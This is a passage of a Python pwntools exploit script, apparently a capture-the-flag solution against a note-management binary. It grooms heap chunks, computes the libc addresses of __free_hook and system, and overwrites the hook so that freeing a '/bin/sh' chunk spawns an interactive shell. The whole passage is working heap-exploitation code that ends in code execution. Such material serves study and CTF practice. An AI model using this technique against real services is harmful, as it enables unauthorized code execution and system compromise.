    add_note(0x78, str(i) * 4, str(i) * 4)

add_note(0x78, "0000", cyclic(48))
del_note(7)

gadget = [0xcbcb1, 0xcbcb4, 0xcbcb7]
hook_addr = libc_addr + libc.sym['__free_hook']
log.info("hook_addr=>{:x}".format(hook_addr))
system_addr = libc_addr + libc.sym['system']
log.info("system_addr=>{:x}".format(system_addr))
add_note(0x78, p64(hook_addr - 0x10), cyclic(47))

add_note(0x78, "0000", cyclic(47))
add_note(0x78, 'aaaa', 'aaaa')
for i in alive:
    del_note(i)
for i in range(5):
    add_note(0x78, str(i) * 4, str(i) * 4)

add_note(0x78, b'/bin/sh\x00', str(i) * 4)
add_note(0x78, p64(system_addr), 'aaaa')

del_note(6)

p.interactive()
```


